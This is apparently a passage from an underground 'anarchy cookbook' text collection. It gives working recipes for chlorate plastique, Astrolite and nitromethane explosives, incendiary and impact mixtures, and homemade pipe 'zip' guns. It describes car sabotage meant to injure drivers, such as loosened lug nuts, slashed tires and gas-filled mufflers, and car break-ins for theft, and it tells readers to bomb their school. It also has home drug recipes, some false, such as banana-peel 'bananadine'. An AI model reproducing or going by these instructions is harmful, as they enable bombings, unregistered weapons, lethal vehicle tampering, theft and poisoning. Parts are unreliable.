if purifi- cation is called fractional crystalization.  These crystals should
be relatively pure potassium chlorate.

 Powder these to the consistency of face powder (400 mesh) and heat gently to
drive off all moisture.  Melt five parts vasoline and five parts wax.
Dissolve this in white gasoline (camp stove gasoline) and pour this liquid on
90 parts potassium chlorate (the crystals from the above operation) in a
plastic bowl. Knead this liquid into the potassium chlorate until immediately
mixed.  Allow all the gasoline to evaporate.  Place this explosive in a cool,
dry place.  Avoid friction, sulfur, sulfide, and phosphorous compounds.

     This explosive is best molded to the desired shape and density
(1.3g./cc.) and dipped in wax to water proof.  These block type charges
guarantee the highest detonation velocity.  This explosive is really not
suited to use in shaped charge applications due to its relatively low
detonation velocity.  It is comparable to 40% ammonia dynamite and can be
considered the same for the sake of charge computation.

    If the potassium chlorate is bought and not made it is put into the
manufacture pro- cess in the powdering stages preceding the addition of the
wax/vaseline mix- ture.  This explosive is bristant and powerful.  The
addition of 2-3% aluminum powder increases its blast effect.  Detonation
velocity is 3300 m/sec..


Plastique Explosives From Swimming Pool Chlorinating Compound    By the Lich

 This explosive is a chlorate explosive from bleach.  This method of
production of potassium or sodium chlorate is easier and yields a more pure
product than does the plastique explosive from bleach process.

  In this reaction the H.T.H. (calcium hypochlorite CaC10) is mixed with water
and heated with either sodium chloride (table salt, rock salt) or potassium
chloride (salt substitute).  The latter of these salts is the salt of choice
due to the easy crystalization of the potassium chlorate.

  This mixture will need to be boiled to ensure complete reaction of the
ingredients.  Obtain some H.T.H.  swimming pool chlorination compound or
equivilant (usually 65% calcium hypochlorite).  As with the bleach process
mentioned earlier the reaction described below is also a dissociation
reaction.  In a large pyrex glass or enamled steel container place 1200g.
H.T.H. and 220g.  potassium chloride or 159g.  sodium chloride.  Add enough
boiling water to dissolve the powder and boil this solution.  A chalky
substance (calcium chloride) will be formed.  When the formation of this
chalky substance is no longer formed the solution is filtered while boiling
hot.  If potassium chloride was used potassium chlorate will be formed.

    This potassium chlorate will drop out or crystalize as the clear liquid
left after filtering cools.  These crystals are filtered out when the solution
reaches room temperature.  If the sodium chloride salt was used this clear
filtrate (clear liquid after filter- ation) will need to have all water
evaporated.  This will leave crystals which should be saved.

    These crystals should be heated in a slightly warm oven in a pyrex dish to
drive off all traces of water (40-75 deg.  C.).  These crystals are ground to
a very fine powder (400 mesh).

    If the sodium chloride salt is used in the initial step the crystalization
is much more time consuming.  The potassium chloride is the salt to use as the
resulting product will crystalize out of the solution as it cools.  The
powdered and completely dry chlorate crystals are kneaded together with
vaseline in a plastic bowl.  ALL CHLORATE BASED EXPLOSIVES ARE SENSITIVE TO
FRICTION AND SHOCK AND THESE SHOULD BE AVOIDED.  If sodium chloride is used in
this explosive it will have a tendancy to cake and has a slightly lower
detonation velocity.

  This explosive is composed of the following:

 potassium/sodium chlorate 90%        vaseline  10%

   Simply pour the powder into a plastic baggy and knead in the vaseline
carefully. this explosive (especially if the Sodium Chlorate variation is
used) should not be exposed to water or moisture.

 The detonation velocity can be raised to a slight extent by the addition of
2-3% aluminum substituted for 2-3% of the vaseline.  This addition of this
aluminum will give the explosive a bright flash if set off at night which will
ruin night vision for a short while.  The detonation velocity of this
explosive is approximately 3200 m/sec.  for the potassium salt and 2900 m/sec.
for the sodium salt based explosive.

Addendum 4/12/91:

   It was claimed above that this explosive degrades over time. I would assume
that this occurs due to the small amount of water present in the vaseline, and
that a different type of fuel would be better than the vaseline.


ASSORTED NASTIES:

                                  Sweet-Oil
 In this one you open there hood and pour some honey in their oil spout.  if
you have time you might remover the oil plug first and drain some of the oil
out.  I have tried this one but wasn't around to see the effects but I am sure
that I did some damage.

                                   Slow Air
 Ok, sneak up the victims car and poke a small hole somewhere in 2 of his/her
tires.  They only have 1 spare.  Now if the hole is small but there then there
tire will go flat some where on the road.  You could slice the tire so this is
blows out on the road wih a razor blade.  Cut a long and fairly deep (don't
cut a hole all the way through) and peel a little bit of the rubber back and
cut that off.  Now very soon there tires will go flat or a possible blow out
at a high speed if your lucky.

                               Vanishing Paint
 Spread a little gas or paint thiner on the victims car and this will make his
paint run and fade.  Vodka will eat the paint off and so will a little 190.
Eggs work great on paint if they sit there long enough.

                                 Loose Wheel
 Loosen the lugs on you victums tires so that they will soon fall off.  This
can really fuck some one up if they are cruising when the tire falls off.

                                 Dual Neutral
   This name sucks but pull the 10 bolt or what ever they have there off.  (On
the real wheels, in the middle of the axle) Now throw some screws, blots, nuts
and assorted things in there and replace the cover. At this point you could
chip some of the teeth off the gears.

                                  Un-Midaser
 Crawl under there car with a rachet and losen all the nuts on their exhaust
so that it hangs low and will fall off soon. This method also works on
transmissions but is a little harder to get all bolts off, but the harder you
work the more you fuck them over.


                                 LAUGHING GAS

Learn how to make laughing gas from ammonium nitrate. Laughing gas was one of
the earliest anaesthetics.  After a little while of inhaling the gas the
patient became so happy [ain't life great?] he couldn't keep from laughing.
Finally he would drift off to a pleasant sleep.

   Some do-it-yourselfers have died while taking laughing gas.  This is
because they has generated it through plastic bags while their heads were
inside. They were simply suffocating but were too bombed out to realize it.
   The trick is to have a plastic clothes bag in which you generate a lot of
the gas.  Then you stop generating the gas and hold a small opening of the bag
under your nose, getting plenty of oxygen in the meantime.  Then, Whee!
  To make it you start with ammonium nitrate bought from a chemical supply
house or which you have purified with 100% rubbing or wood alcohol.

  First, dissolve a quantity of ammonium nitrate in some water.  Then you
evaporate the water over the stove, while stirring, until you have a heavy
brine.  When nearly all the moisture is out it should solidify instantly when
a drop is put on an ice cold metal plate.

  When ready, dump it all out on a very cold surface.  After a while, break
it up and store it in a bottle.

   A spoonful is put into a flask with a one-hole stopper, with a tube leading
into a big plastic bag.  The flask is heated with an alcohol lamp.

   When the temperature in the flask reaches 480 F the gas will generate.  If
white fumes appear the heat should be lowered as the stuff explodes at 600 F.

  When the bag is filled, stop the action and get ready to turn on.

CAUTION:  N2O supplants oxygen in your blood, but you don't realize it.  It's
        easy to die from N2O because you're suffocating and your breathing
        reflex doesn't know it.  Do not put your head in a plastic bag
        (duhh...) because you will cheerfully choke to death.

                              PIPE OR "ZIP" GUNS

    Commonly known as "zip" guns, guns made from pipe have been used for years
by juvenile punks.  Today's Militants   make them just for the hell of it or
to shoot once in an   assassination or riot and throw away if there is any
danger of apprehension.

    They can be used many times but with some, a length of dowel is needed to
force out the spent shell.

    There are many variations but the illustration shows the basic design.

    First, a wooden stock is made and a groove is cut for the barrel to rest
in.  The barrel is then taped securely to the stock with a good, strong
tape.

    The trigger is made from galvanized tin.  A slot is punched in the trigger
flap to hold a roofing nail, which is wired or soldered onto the flap.  The
trigger is bent and nailed to the stock on both sides.

    The pipe is a short length of one-quarter inch steel gas or water pipe
with a bore that fits in a cartridge, yet keeps the cartridge rim from passing
through the pipe.

    The cartridge is put in the pipe and the cap, with a hole bored through
it, is screwed on.  Then the trigger is slowly released to let the nail pass
through the hole and   rest on the primer.

    To fire, the trigger is pulled back with the left hand and held back with
the thumb of the right hand.  The gun is then aimed and the thumb releases the
trigger and the thing actually fires.

    Pipes of different lengths and diameters are found in any hardware store.
All caliber bullets, from the .22 to the .45 are used in such guns.

    Some zip guns are made from two or three pipes nested within each other.
For instance, a .22 shell will fit snugly into a length of a car's copper gas
line. Unfortunatey, the copper is too weak to withstand the pressure of the
firing.  So the length of gas line is spread   with glue and pushed into a
wider length of pipe.  This is   spread with glue and pushed into a length of
steel pipe with threads and a cap.

    Using this method, you can accomodate any cartridge, even a rifle shell.
The first size of pipe for a rifle   shell accomodates the bullet.  The second
accomodates its wider powder chamber.

    A 12-gauge shotgun can be made from a 3/4 inch steel pipe.  If you want to
comply with the gun laws, the barrel should be at least eighteen inches long.

    Its firing mechanism is the same as that for the pistol. It naturally has
a longer stock and its handle is lengthened into a rifle butt.  Also, a small
nail is driven half way into each side of the stock about four inches in the
front of the trigger.  The rubber band is put over one nail and   brought
around the trigger and snagged over the other nail.

    In case you actually make a zip gun, you should test it before firing it
by hand.  This is done by first tying the gun to a tree or post, pointed to
where it will do no damage.  Then a string is tied to the trigger and you go
off several yards.  The string is then pulled back and let go. If the barrel
does not blow up, the gun is (probably) safe to fire by hand. Repeat firings
may weaken the barrel, so NO zip gun can be considered "safe" to use.


Astrolite and Sodium Chlorate Explosives By: Future Spy & The Fighting Falcon

Note: Information on the Astrolite Explosives were taken from the book
 'Two Component High Explosive Mixtures' By Desert Pub'l

Some of the chemicals used are somewhat toxic, but who gives a fuck! Go ahead!
I won't even bother mentioning 'This information is for enlightening purposes
only'! I would love it if everyone made a gallon of astrolite and blew their
fucking school to kingdom scum!

                                  Astrolite

The astrolite family of liquid explosives were products of rocket propellant
research in the '60's.  Astrolite A-1-5 is supposed to be the world's most
powerful non-nuclear explosive -at about 1.8 to 2 times more powerful than
TNT. Being more powerful it is also safer to handle than TNT (not that it
isn't safe in the first place) and Nitroglycerin.

                                 Astrolite G
"Astrolite G is a clear liquid explosive especially designed to produce very
high detonation velocity, 8,600MPS (meters/sec.), compared with 7,700MPS for
nitroglycerin and 6,900MPS for TNT...In addition, a very unusual
characteristic is that it the liquid explosive has the ability to be absorbed
easily into the ground while remaining detonatable...In field tests, Astrolite
G has remained detonatable for 4 days in the ground, even when the soil was
soaked due to rainy weather" know what that means?....Astrolite Dynamite!

              To make (mix in fairly large container & outside)
    Two parts by weight of ammonium nitrate mixed with one part by weight
'anhydrous' hydrazine, produces Astrolite G...Simple enough eh? I'm sure that
the 2:1 ratio is not perfect,and that if you screw around with it long enough,
that you'll find a better formula.  Also, dunno why the book says 'anhydrous'
hydrazine, hydrazine is already anhydrous...

    Hydrazine is the chemical you'll probably have the hardest time getting
hold of. Uses for Hydrazine are: Rocket fuel, agricultural chemicals (maleic
hydra-zide), drugs (antibacterial and antihypertension), polymerization
catalyst, plating metals on glass and plastics, solder fluxes, photographic
developers, diving equipment.  Hydrazine is also the chemical you should be
careful with.

                              Astrolite A/A-1-5
Mix 20% (weight) aluminum powder to the ammonium nitrate, and then mix with
hydrazine.  The aluminum powder should be 100 mesh or finer.  Astrolite A has
a detonation velocity of 7,800MPS.

                                 Misc.  info
You should be careful not to get any of the astrolite on you,if it happens
though, you should flush the area with water.  Astrolite A&G both should be
able to be detonated by a #8 blasting cap.


                           Sodium Chlorate Formulas

Sodium Chlorate is similar to potassium chlorate,and in most cases can be a
substitute.  Sodium chlorate is also more soluble in water.  You can find
sodium chlorate at Channel or any hardware/home improvement store.  It is used
in blowtorches and you can get about 3lbs for about $6.00.

                          Sodium Chlorate Gunpowder

65% sodium chlorate, 22% charcoal, 13% sulfur, sprinkle some graphite on top.

                                 Rocket Fuel
6 parts sodium chlorate mixed *THOROUGHLY* with 5 parts rubber cement.

                      Rocket Fuel 2 (better performance)

50% sodium chlorate, 35% rubber cement ('One-Coat' brand),
10% epoxy resin hardener, 5% sulfur

You may want to add more sodium chlorate depending on the purity you are using.

                              Incendiary Mixture
55% aluminum powder (atomized), 45% sodium chlorate, 5% sulfur

                                Impact Mixture
50% red phosphorus, 50% sodium chlorate

Unlike potassium chlorate,sodium chlorate won't explode spontaneously when
mix- ed with phosphorus.  It has to be hit to be detonated.

                               Filler explosive
85% sodium chlorate, 10% vaseline, 5% aluminum powder

                            Nitromethane formulas
I thought that I might add this in since it's similar to Astrolite.

Nitromethane (CH3NO2)              specific gravity:1.139
flash point:95f                    auto-ignite:785f

Derivation: reaction of methane or propane with nitric acid under pressure.
Uses:       Rocket fuel; solvent for cellulosic compounds, polymers, waxes,
fats, etc.

To be detonated with a #8 cap, add:

1) 95% nitromethane + 5% ethylenediamine 2) 94% nitromethane + 6% aniline

Power output: 22-24% more powerful than TNT.  Detonation velocity of 6,200MPS.

                       Nitromethane 'solid' explosives
2 parts nitromethane, 5 parts ammonium nitrate (solid powder)

soak for 3-5 min.  when done,store in an air-tight container.  This is
supposed to be 30% more powerful than dynamite containing 60% nitro-glycerin,
and has 30% more brilliance.


            MERCURY BATTERY BOMB!      By Phucked Agent!

Materials:

1 Mercury Battery (1.5 or 1.4 V Hearing Aid), 1 working lamp with on/off 
  switch

  It is VERY SIMPLE!!! Hurray! Kids under 18 shouldn't considered try this

How to grow Marijuana                       courtesy of the Jolly Roger
(With some little known facts -RF-)
                           MARIJUANA
Marijuana is a deciduous plant which grows from seeds. The fibrous section
of the plant was (has been replaced by synthetics) used to make rope.
The flowering tops, leaves, seeds, and resin of the plant is
used by just about everyone to get HIGH.
Normally, the vegetable parts of the plant are smoked to produce this
"high," but thay can also be eaten. The axtive ingredient in marijuana
resin is THC (tetahydrocannabinol). Marijuana contains from 1 - 4 per
cent THC (4 per cent must be considered GOOD dope).
Marijuana grows wild in many parts of the world, and is cultivated in
Mexice, Vietnam, Africa, Nepal, India, South America, etc.,etc. The
marijuana sold in the United States comes primarily from, yes, the
Uniited States.
It is estimated that at least 50 per cent of the grass on the streets
in America is homegrown. The next largest bunch comes actoss the
borders from Mexico, with smaller amounts filtering in from Panama,
occasionally South America, and occasinally, Africa.
Hashish is the pure resin of the marijuana plant, which is scraped from
the flowering tops of the plant and lumped together. Ganja is the
ground-up tops of the finest plants. (It is also the name given to any
sort of marijuana in Jamaica.)
Marijuana will deteriorate in about two years if exposed to light,
air or heat. It should always be stored in cool places.
Grass prices in the United States are a direct reflection of the laws
of supply and demand (and you thought that high school economics
would never be useful). A series of large border busts, a short growing
season, a bad crop, any number of things can drive the price of marijuana
up. Demand still seems to be on the increase in the U.S., so prices seldom
fall below last year's level.
Each year a small seasonal drought occurs, as last year's supply runs
low, and next year's crop is not up yet. Prices usually rase about
20 - 75 per cent during this time and then fall back to "normal."
Unquestionably, a large shortage of grass causes a percentage of smokers
to turn to harder drugs instead. For this reason, no grass control
program can ever be beneficial or "successful."
                                GROW IT!
There is one surefire way of avoiding high prices and the grass DT's:
Grow your own. This is not as difficult as some "authorities" on the
subject would make you believe. Marijuana is a weed, and a fairly
vivacious one at that, and it will grow almost in spite of you.
                               OUTDOORS
Contrary to propular belief, grass grows well in many place on the
North American continent. It will flourish even if the temperature does
not raise above 75 degrees.
The plants do need a minimum of eight hours of sunlight per day and
should be planted in late April/early May, BUT DEFINITELY, after the
last frost of the year.
Growing an outdoor, or "au naturel", crop has been the favored method
over the years, because grass seems to grow better without as much
attention when in its natural habitat.
Of course, an outdoors setting requires special precautions not encoun-
tered with an indoors crop; you must be able to avoid detection, both from
law enforcement freaks and common freaks, both of whom will take your
weed and probably use it. Of course, one will also arrest you. You must
also have access to the area to prepare the soil and harvest the crop.
There are two schools of thought about starting the seeds. One says you
should start the seedlings for about ten days in an indoor starter box
(see the indoor section) and then transplant. The other theory is that
you should just start them in the correct location. Fewer plants will
come up with this method, but there is no shock of transplant to
kill some of the seedlings halfway through.
The soil should be preprepared for the little devils by turning it
over a couple of times and adding about one cup of hydrated lime per
square yard of soil and a little bit (not too much, now) of good water
soluble nitrogen fertilizer. The soil should now be watered several
times and left to sit about one week.
The plants should be planted at least three feet apart, getting too
greedy and stacking them too close will result in stunted plants.
The plants like some water during their growing season, BUT not too
much. This is especially true around the roots, as too much water will
rot the root system.
Grass grows well in corn or hops, and these plants will help provide
some camouflage. It does not grow well with rye, spinach, or pepperweed.
It is probally a good idea to plant in many small, broken patches, as
people tend to notice patterns.
                       GENERAL GROWING INFO
Both the male and he female plant produce THC resin, although the male
is not as strong as the female. In a good crop, the male will still be
plenty smokable and should not be thrown away under any circumstances.
Marijuana can reach a hight of twenty feet (or would you rather wish on
a star) and obtain a diameter of 4 1/2 inches. If normal, it has a sex
ratio of about 1:1, but this can be altered in several ways.
The male plant dies in the 12th week of growing, the female will live
another 3 - 5 weeks to produce her younguns. Females can weigh twice as
much as males when they are mature.
Marijuana soil should compact when you squeeze it, but should also break
apart with a small pressure and absorb water well. A nice test
for either indoor or outdoor growing is to add a bunch of worms to the
soil, if they live and hang aroung, it is good soil, but if they don't,
well, change it. Worms also help keep the soil loose enough for the
plants to grow well.
                                SEEDS
To get good grass, you should start with the right seeds. A nice starting
point is to save the seeds form the best batch you have consumed. The
seeds should be virile, that is, they should not be grey and shiriveled
up, but green, meaty, and healthy appearing. A nice test is to drop the
seeds on a hot frying pan. If they "CRACK," they are probably good for
planting purposes.
The seeds should be soaked in distilled water overnight before planting.
BE SURE to plant in the ground with the pointy end UP. Plant about 1/2"
deep. Healthy seeds will sprout in about five days.
                             SPROUTING
The best all around sprouting method is probably to make a sprouting box
(as sold in nurseries) with a slated bottom or use paper cups with holes
punched in the bottoms. The sprouting soil should be a mixture of humus,
soil, and five sand with a bit of organic fertilizer and water mixed
in about one week before planting.
When ready to transplant, you must be sure and leave a ball of soil
around the roots of each plant. This whole ball is dropped into a
baseball-sized hold in the permanent soil.
If you are growing/transplanting indoors, you should use a green
safe light (purchased at nurseries) during the transplanting operation.
If you are transplanting outdoors, you should time it about two
hours befor sunset to avoid damage to the plant. Always wear cotton
gloves when handling the young plants.
After the plants are set in the hole, you should water them. It is also
a good idea to use a commercial transplant chemical (also purchased at
nurseries) to help then overcome the shock.
                          INDOOR GROWING
Indoor growing has many advantages, besides the apparent fact that it
is much harder to have your crop "found," you can control the ambient
conditions just exactly as you want them and get a guaranteed "good"
plant.
Plants grown indoors will not appear the same as their outdoor cousins.
They will be scrawnier appearing with a weak stems and may even require
you to tie them to a growing post to remain upright, BUT THEY WILL HAVE
AS MUCH OR MORE RESIN!
If growing in a room, you should put tar paper on the floors and then
buy sterilized bags of soil form a nursery. You will need about one
cubic foot of soil for eavh plant.
The plants will need about 150 ml. of water per plant/per week. They
will also need fresh air, so the room must be ventilated. (however,
the fresh air should contain NO TOBACCO smoke.)
At least eight hours of light a day must be provided. As you increase
the light, the plants grow faster and show more females/less males.
Sixteen hours of light per day seems to be the best combination, beyond
this makes little or no appreciable difference in the plant quality.
Another idea is to interrupt the night cycle with about one hour of
light. This gives you more females.
The walls of your growing room should be painted white or covered with
aluminum foil to reflect the light.
The lights themselves can be either bulbs of fluorescent. Figure about
75 watts per plant or one plant per two feet of flouresent tube.
The fluorescents are the best, but do not use "cool white" types. The
light sources should be an average of twenty inches from the
plant and NEVER closer than 14 inches. They may be mounted on a rack
 and moved every few days as the plants grow.
The very best light sources are those made by Sylvania and others
especially for growing plants (such as the "gro lux" types).
                       HARVESTING AND DRYING
The male plants will be taller and have about five green or yellow sepals,
which will split open to fertilize the female plant with pollen.
The female plant is shorter and has a small pistillate flower, which
really doesn't look like a flower at all but rather a small bunch of
leaves in a cluster.   
If you don't want any seeds, just good dope, you should pick the males
before they shed their pollen as the female will use some of her resin
to make the seeds.
After another three to five weeks, after the males are gone, the females
will begin to wither and die (from loneliness?), this is the time to pick.
In some nefarious Middle Eastren countries, farmers reportedly put their
beehives next to fiels of marijuana. The little devils collect the grass
pollen for their honey, which is supposed to contain a fair dosage
of THC.
The honey is then enjoyed by conventional methods or made into ambrosia.
If you want seeds - let the males shed his pollen then pick him. Let
the female go another month and pick her.
To cure the plants, they must be dried. On large crops, this is
accomplished by constructing a drying box or drying room.
You must have a heat source (such as an electric heater) which will make
the box/room each 130 degrees. The box/room must be ventilated
to carry off the water-vapor-laden air and replace it with fresh.
A good box can be constructed from an orange crate with fiberglass
insulated walls, vents in the tops, and screen shelves to hold the leaves.
There must be a baffle between the leaves and the heat source.
A quick cure for smaller amounts is to: cut the plant at the soil level
and wrap it in a cloth so as not to loose any leavs. Take out any seeds
by hand and store. Place all the leaves on a cookie sheet or aluminum
foil and put them in the middle sheld of the oven, which is set on "broil."
In a few seconds, the leaves will smoke and curl up, stir them around and
give another ten seconds before you take them out.
                    TO INCREASE THE GOOD STUFF
There are several tricks to increase the number of females, or the THC
content of plants:
You can make the plants mature in 36 days if you are in a hurry, by cutting
back on the light to about 14 hours, but the plants will not be as big.
You should gradually shorten the light cycle until you reach fourteen
hours.
You can stop any watering as the plants begin to bake the resin rise to
the flowers. This will increse the resin a bit.
You can use a sunlamp on the plants as they begin to develop flower stalks.
You can snip off the flower, right at the spot where it joins the plant,
and a new flower will form in a couple of weeks.
This can be repeated two or three times to get several times more flowers
than usual.
If the plants are sprayed with Ethrel early in their growing stage, they
will produce almost all female plants. This usually speeds up the flowering
also, it may happen in as little as two weeks.
You can employ a growth changer called colchicine. This is a bit hard to
get and expensive. (Should be ordered through a lab of some sort and
costs about $35 a gram.)
To use the colchicine, you should prepare your presoaking solution of
distilled water with about 0.10 per cent colchicine. This will cause
many of the seeds to die and not germinate, but the ones that do come
up will be polyploid plants. This is the accepted difference between
such strains as "gold" and normal grass, and yours will DEFINITELY
be superweed.
The problem here is that colchicine is a posion in larger quanities and
may be poisonous in the first generation of plants. Bill Frake, author
of CONNOISSEUR'S HANDBOOK OF MARIJUANA runs a very complete colchicine
treatment down and warns against smoking the first generation plants
(all succeeding generations will also be polyploid) bacause of this
poisonous quality.
However, the Medical Index shows colchicine being given in very small
quantities to people for treatment if various ailments. Although these
quantities are small, they would appear to be larger than any you could
recive form smoaking a seed-treated plant.
It would be a good idea to buy a copy of CONNOISSEUR'S, if you are planning
to attempt this, and read Mr. Drake's complete instructions.
Another still-experimental process to increase the resin it to pinch off
the leaf tips as soon as they appear from the time the plant is in the
seedling stage on through its entire life-span. This produces a distorted,
wrecked-looking plant which would be very difficuly to recognize as
marijuana. Of course, there is less substance to this plant, but such
wrecked creatures have been known to produve so much resin that it
crystallizes a strong hash all over the surface of the plant - might
be wise to try it on a plant or two and see what happens.
                        PLANT PROBLEM CHART
Always check the overall enviromental conditions prior to passing
judgment - soil aroung 7 pH or slightly less - plenty of water, light,
fresh air, loose soil, no water standing in pools.

                         EXTRA SECTION:
                       BAD WEED/GOOD WEED
Can you turn bad weed into good weed? Surprisingly enough, the answer
to this oft-asked inquiry is, yes!
Like most other things in life, the amount of good you are going
to do relates directly to how much effort you are going to put into it.
There are no instant, supermarket products which you can spray on Kansas
catnip and have wonderweed, but there are a number of simplified,
inexpensive processes (Gee, Mr. Wizard!) thich will enhance mediocre
grass somewhat, ant there are a couple of fairly involved processes
which will do up even almost-parsley weed into something worth writing
home about.
                                   EASES
1. Place the dope in a container which allows air to enter in a restricted
fashion (such as a can with nail holes punched in its lid) and add a
bunch of dry ice, and the place the whold shebang in the freezer for a
few days. This process will add a certain amount of potency to the product,
however, this only works with dry ice, if you use normal, everyday
freezer ice, you will end up with a soggy mess...
2. Take a quantity of grass and dampen it, place in a baggie or another
socially acceptable container, and store it in a dark, dampish place
for a couple of weeks (burying it also seems to work). The grass will
develop a mold which tastes a bit harsh, a and burns a tiny bit funny,
but does increase the potency.
3. Expose the grass to the high intensity light of a sunlamp for a full
day or so. Personally, I don't feel that this is worth the effort, but
if you just spent $400 of your friend's money for this brick of
super-Colombian, right-from-the-President's-personal-stash,
and it turns out to be Missouri weed, and you're packing your bags to
leave town before the people arrive for their shares, well, you might
at least try it. Can't hurt.
4. Take the undisirable portions of our stash (stems, seeds, weak weed,
worms, etc.) and place them in a covered pot, with enough rubbing
alchol to cover everything.
Now CAREFULLY boil the mixture on an ELECTRIC stove or lab burner. DO
NOT USE GAS - the alchol is too flammable. After 45 minutes of heat,
remove the pot and strain the solids out, SAVING THE ALCOHOL.
Now, repeat the process with the same residuals, but fresh alchol.
When the second boil is over, remove the solids again, combine the two
quantities of alcohol and reboil until you have a syrupy mixture.
Now, this syrupy mixture will contain much of the THC formerly hidden
in the stems and such. One simply takes this syrup the throughly
combines it with the grass that one wishes to improve upon.
          SPECIAL SECTION ON RELATED SUBJECT MARYGIN:
Marygin is an anagram of the words marijuana and gin, as in Eli Whitney.
It is a plastic tumbler which acts much like a commercial cottin gin.
One takes about one ounce of an harb and breaks it up. This is then placed
in the Marygin and the protuding knod is roatated. This action turns
the internal wheel, which separates the grass from the debris (seeds,
stems).
It does not pulberize the grass as screens have a habit of doing and is
easily washable.
Marygin is available from:

      LSD                                    courtesy of Exodus

          I  think,  of  all the drugs on the black market today, LSD is
          the strangest. It is the most recent major  drug  to  come  to
          life  in  the psychedelic subculture. (Blah blah blah... let's
          get to the good stuff: How to make it in your kitchen!!)

       1) Grind up 150 grams of Morning Glory seeds or baby  Hawaiian
          wood rose seeds.
       2) In 130 cc. of petroleum ether, soak the seeds for two days.
       3) Filter the solution through a tight screen.
       4) Throw away the liquid, and allow the seed mush to dry.
       5)  For  two  days  allow  the mush to soak in 110 cc. of wood
          alcohol.
       6) Filter the solution again, saving the liquid  and  labeling
          it "1."
       7)  Resoak  the  mush  in 110 cc.  of  wood  alcohol  for  two
          days.
       8) Filter and throw away the mush.
       9) Add the liquid from the second soak to the solution labeled
          "1."
      10)  Pour  the  liquid  into  a  cookie  tray  and allow it to
          evaporate.
      11) When all of  the  liquid  has  evaporated,  a  yellow  gum
          remains. This should be scraped up and put into capsules.

               30 grams of Morning Glory seeds = 1 trip
               15 Hawaiian wood rose seeds = 1 trip

          Many  companies,  such as Northop-King have been coating their
          seeds with a toxic chemical, which is poison. Order seeds from
          a wholesaler, as it is much safer and cheaper.  Hawaiian  wood
          rose seeds can be ordered directly from:

  LSD DOSAGES
  -----------

          The  basic dosages of acid vary according to what kind of acid
          is available and what medium of ingestion is used. Chemically,
          the potency of LSD-25 is measured in micrograms, or  mics.  If
          you're  chemically  minded  or  making  your  own  acid,  then
          computing the number of micrograms is very important.  Usually
          between  500  and  800  mics  is  plenty  for  an 8 hour trip,
          depending on the quality of the acid, of course. I have  heard
          of people taking as much as 1,500-2,000 mics. This is not only
          extremely dangerous, it is extremely wasteful.

          LSD  comes  packaged  in many different forms. The most common
          are listed below:
 
          1) The brown spot, or a piece of paper with a dried  drop
               of  LSD  on it, is always around. Usually one spot equals
               one trip.
          2) Capsuled acid is very tricky, as the cap can be almost
               any color, size, or potency. Always ask what the acid  is
               cut  with,  as  a lot of acid is cut with either speed or
               strychnine. Also note dosage.
          3) Small white or colored  tablets  have  been  known  to
               contain acid, but, as with capsuled acid, it's impossible
               to tell potency, without asking.

      Bananas                                courtesy of Exodus

          Believe  it  or  not,  bananas  do contain a small quantity of
          _Musa Sapientum bananadine_, which is  a  mild,  short-lasting
          psychedelic.  There  are much easier ways of getting high, but
          the great advantage to this method is that bananas are legal.

          1) Obtain 15 lbs. of ripe yellow bananas.
          2) Peel all 15 lbs. and eat the fruit. Save the peels.
          3) With a sharp knife, scrape off the insides of the peels and
          save the scraped material.
          4) Put all of the scraped material in  a  large  pot  and  add
          water.  Boil  for  three to four hours until it has attained a
          solid paste consistency.
          5) Spread this paste on cookie sheets, and dry in an over  for
          about  20  minutes  to a half hour. This will result in a fine
          black powder. Makes about  one  pound  of  bananadine  powder.
          Ususally one will feel the effects of bananadine after smoking
          three or four cigarettes.

Bananas:
1. Obtain 15 pounds of ripe yellow bananas
2. Peel all and eat the fruit. Save the peelings
3. Scrape all the insides of the peels with a sharp knife.
4. Put all the scraped material in a large pot and add water.
5. Boil 3 or 4 hours until it has attained a solid paste considtency.
6. Spread paste onto cookie sheets and dry in ofen for about 20
   minutes. This will result in fine black powder. Usually one will
   feel the effects after smoking three to four cigarettes.

Cough syrup:
mix robitussion a-c with an equal amount of ginger ale and drink. The
effect are sedation and euphoria. Never underestimate the effects of
any drug! You can od on cough syrup!

Toads:
1. Collect five to ten toads, frogs will not work. The best kind are
   tree toads.
2. Kill them as painlessly as possible, and skin immediately.
3. Allow the skins to dry in a refrigerator four four to five days, or
   until the skins are brittle.
4. Now crush the skins into powder and smoke. Due to its bad taste you
   can mix it with a more fragrent smoking medium.

Nutmeg:
1. Take several whole nutmegs and grind them up in an old grinder.
2. After the nutmegs are ground. Place in a mortar and pulverize with
   a pestle.
3. The usual dosage is about 10 or 15 grams. A larger dose may
   produce excessive thirst,anxiety,and rapid hart beat, but
   hallucinations are rare.

Peanuts:
1. Take 1 pound of raw peanuts (not roasted)
2. Shell them, saving the skins and discarding the shells.
3. Eat the nuts.
4. Grind up the skins and smoke them.

Ways to send a car to Hell            by The Jolly Roger

There are 1001 ways to destroy a car but I am going to cover only
the ones that are the most fun (for you), the most destructive
(for them), and the hardest to trace (for the cops).

- Place thermite on the hood, light it, and watch it burn all the
way through the pavement!

- Tape a CO2 bomb to the hood, axel, gas tank, wheel, muffler,
etc.)

- Put a tampon, dirt, sugar (this one is good!), a ping pong ball,
or just about anything that will dissolve in the gas tank.
Plastic deforms and dilutes into gas.  The final result is much
harder to inject into the engine, possibly causing valve replacement.


- Put potatoes, rocks, banannas, or anything that will fit, into
the tailpipe. Use a broom handle to stuff 'em up into the
tailpipe.

- Put a long rag into the gas tank and light it...

- Steal a key, copy it, replace it, and then steal the stereo.

- Break into the car. Cut a thin metal ruler into a shape like
this:
                    (Revised ill. 4.14)
               
               
               
               
              
              
             

Slide it into the outside window and keep pulling it back up until
you catch the lock cable which should unlock the door. This device
is also called a SLIM JIM. Now get the stereo, equalizer, radar
detector, etc. Now destroy the inside. (A sharp knife does wonders
on the seats!)

spare time.  Move the windshield wiper blades, and insert and glue
tacks.  The tacks make lovely designs.  If your "friend" goes to
school with you, Just before he comes out of school.  Light a lighter
and then put it directly underneath his car door handle.
Wait...Leave...Listen.  When you hear a loud "shit!", you know he
made it to his car in time.  Remove his muffler and pour approximately
1 Cup of gas in it. Put the muffler back, then wait till their car starts.
Then you have a cigarette lighter.  A 30 foot long cigarette lighter.
This one is effective, and any fool can do it.  Remove the top
air filter. That's it!  Or a oldie but goodie: sugar in the gas tank.
Stuff rags soaked in gas up the exhaust pipe.  Then you wonder why
your "friend" has trouble with his/her lungs.  Here's one that takes
time and many friends.  Take his/her car then break into their house
and reassemble it, in their living or bedroom.  Phun eh?  If you're
into engines, say eeni mine moe and point to something and remove it.
They wonder why something doesn't work. There are so many others, but
the real good juicy ones come by thinking hard.

Electronic Terrorism                            by The Jolly Roger

It starts when a big, dumb lummox rudely insults you.  Being of a
rational, intelligent disposition, you wisely choose to avoid a
